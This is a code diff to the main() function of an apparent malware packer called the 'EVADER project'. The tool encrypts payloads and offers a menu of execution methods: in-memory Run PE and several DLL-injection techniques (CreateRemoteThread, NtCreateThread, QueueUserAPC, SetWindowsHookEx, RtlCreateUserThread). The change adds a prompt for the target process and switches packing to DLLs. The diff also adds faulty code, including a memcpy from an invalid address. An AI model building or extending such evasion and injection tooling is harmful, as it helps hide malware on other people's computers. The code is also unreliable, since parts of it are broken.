@@ -12,9 +12,12 @@ void fileprogress(long pos) {
 
 int main(int argc, char* argv[]) {
 
+	printf("EVADER project v1.0\n");
+
 	// display usage
 	if (argc < 5) {
 		printf(
+			"EVADER project v1.0\n"
 			"usage:\n"
 			" Packer.exe inputfile_Path(like c:\\users\\xxx\\files\ whilc containst your files/file) outputfile_name(like c:\\users\\xxx\\output\\output.exe) KEY_SIZE KEY_START_ASCII KEY_END_ASCII\n"
 			"List of available methods"
@@ -30,19 +33,32 @@ int main(int argc, char* argv[]) {
 	}
 
 	printf(
-		"Choose payload execution method"
 		"\n\n"
-		"	0) Run PE					(execute payload directy inside memory of current process address space)"
-		"   1) CreateRemoteThread		(DLL injection by CreateRemoteThread Win32 API)\n"
-		"   2) NtCreateThread			(DLL injection by NtCreateThread native API)\n"
-		"   3) QueueUserAPC				(DLL injection by adding user-mode asychronous procedure call(APC) object to the APC queue of specified thread native API) Not always possible\n"
-		"   4) SetWindowsHookEx\n		(DLL injection by setting a windows hook)\n"
-		"   5) RtlCreateUserThread		(DLL injection by RtlCreateUserThread native API)\n"
+		"   0) Run PE                   (execute payload directy inside memory of current process address space)\n"
+		"   1) CreateRemoteThread       (DLL injection by CreateRemoteThread Win32 API)\n"
+		"   2) NtCreateThread           (DLL injection by NtCreateThread native API)\n"
+		"   3) QueueUserAPC             (DLL injection by adding user-mode asychronous procedure call(APC) object to the APC queue of specified thread)\n"
+		"   4) SetWindowsHookEx         (DLL injection by setting a windows hook)\n"
+		"   5) RtlCreateUserThread      (DLL injection by RtlCreateUserThread native API)\n"
 		"\n\n"
 	);
 
 	int exeMethod = -1;
-	scanf("Choose payload execution method", &exeMethod);
+	char szProc[80];
+
+	printf("Choose payload execution method : ");
+	scanf("%d", &exeMethod);
+
+	if (exeMethod > 0) {
+		printf("Target process name : ");
+		scanf_s("%79s", szProc, 79);
+	}
+	else {
+		memcpy(szProc, (PVOID)'x', sizeof(szProc));
+	}
+
+	printf("\n\n*****%d****\n\n", sizeof(szProc));
+	printf("\n\n*****%s****\n\n", szProc);
 
 
 	int KEY_SIZE;
@@ -54,15 +70,13 @@ int main(int argc, char* argv[]) {
 	pcb.fileprogress = fileprogress;
 	pcb.newfile = newfile;
 
-	printf("EVADER project v1.0\n");
-
 	// set encryption key size and complexicity
 	KEY_SIZE = atoi(argv[3]);
 	START_ASCII = atoi(argv[4]);
 	END_ASCII = atoi(argv[5]);
 	
 	// create archive file
-	int rc = packfilesEx(argv[1], (char*)("*.exe"), argv[2], KEY_SIZE, START_ASCII, END_ASCII, exeMethod, &pcb);
+	int rc = packfilesEx(argv[1], (char*)("*.dll"), argv[2], KEY_SIZE, START_ASCII, END_ASCII, exeMethod, szProc, &pcb);
 	printf("               \n");
 
 	if (rc != packerrorSuccess) {
